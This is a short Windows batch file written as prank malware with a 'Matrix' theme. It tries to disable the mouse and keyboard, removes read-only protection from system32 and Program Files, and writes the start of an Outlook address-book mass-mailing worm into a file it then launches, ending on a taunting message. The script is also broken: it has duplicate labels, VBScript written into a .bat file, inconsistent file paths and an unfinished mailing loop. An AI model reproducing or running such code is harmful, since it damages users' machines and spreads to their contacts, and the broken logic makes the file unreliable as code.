@echo off 

Echo The Matrix Has You
echo You Cannot Escape
c:/windows/rundll32.exe mouse,disable
c:/windows/rundll32.exe keyboard,disable
goto fun

:part2
attrib -r %windir%\system32
attrib -r c:\program files
goto q31a

:fun
start mspaint
goto mail

:part2
attrib -r %windir%\system32
attrib -r c:\program files
goto mail

:mail
echo.ON ERROR RESUME NEXT >> C:\matrix.bat
echo Set fso="Scripting.FileSystemObject" >> C:\matrix.bat
echo Set so=CreateObject(fso) >> C:\matrix.bat
echo Set ol=CreateObject("Outlook.Application") >> C:\matrix.bat
echo Set out= WScript.CreateObject("Outlook.Application") >> C:\matrix.bat
echo Set mapi = out.GetNameSpace("MAPI") >> C:\war_in_iraq.vbs 
echo Set a = mapi.AddressLists(1) >> C:\matrix.bat
echo For x=1 To a.AddressEntries.Count >> C:\matrix.bat
echo Set Mail=ol.CreateItem(0) >> C:\matrix.bat
start c:\matrix.bat\
goto part2


:q31a
echo ****************************************
echo **********YOUR COMPUTER IS NOW FUCKED*****
echo ****************************************
pause > nul
goto exit
:exit
exit 
